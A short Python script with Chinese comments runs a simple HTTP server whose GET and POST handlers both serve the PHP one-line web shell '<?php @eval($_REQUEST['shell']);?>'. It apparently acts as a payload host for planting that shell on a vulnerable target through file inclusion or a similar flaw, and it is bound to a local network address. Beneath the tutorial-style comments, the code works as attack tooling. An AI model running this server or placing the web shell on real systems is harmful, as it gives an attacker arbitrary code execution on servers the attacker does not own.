import http.server


class RequestHandlerImpl(http.server.BaseHTTPRequestHandler):
    """
    自定义一个 HTTP 请求处理器
    """
    
    def do_GET(self):
        """
        处理 GET 请求, 处理其他请求需实现对应的 do_XXX() 方法
        """
        # print(self.server)                # HTTPServer 实例
        # print(self.client_address)        # 客户端地址和端口: (host, port)
        # print(self.requestline)           # 请求行, 例如: "GET / HTTP/1.1"
        # print(self.command)               # 请求方法, "GET"/"POST"等
        # print(self.path)                  # 请求路径, Host 后面部分
        # print(self.headers)               # 请求头, 通过 headers["header_name"] 获取值
        # self.rfile                        # 请求输入流
        # self.wfile                        # 响应输出流

        # 1. 发送响应code
        self.send_response(200)

        # 2. 发送请求头
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()

        # 3. 发送响应内容（此处流不需要关闭）
        self.wfile.write("<?php @eval($_REQUEST['shell']);?>\n".encode("utf-8"))

    def do_POST(self):
        """
        处理 POST 请求
        """
        # 0. 获取请求Body中的内容（需要指定读取长度, 不指定会阻塞）
        req_body = self.rfile.read(int(self.headers["Content-Length"])).decode()
        print("req_body: " + req_body)

        # 1. 发送响应code
        self.send_response(200)

        # 2. 发送请求头
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()

        # 3. 发送响应内容（此处流不需要关闭）
        self.wfile.write(("<?php @eval($_REQUEST['shell']);?>" + req_body + "\n").encode("utf-8"))


# 服务器绑定的地址和端口
server_address = ("192.168.43.55", 8000)

# 创建一个 HTTP 服务器（Web服务器）, 指定绑定的地址/端口 和 请求处理器
httpd = http.server.HTTPServer(server_address, RequestHandlerImpl)

# 循环等待客户端请求
httpd.serve_forever()
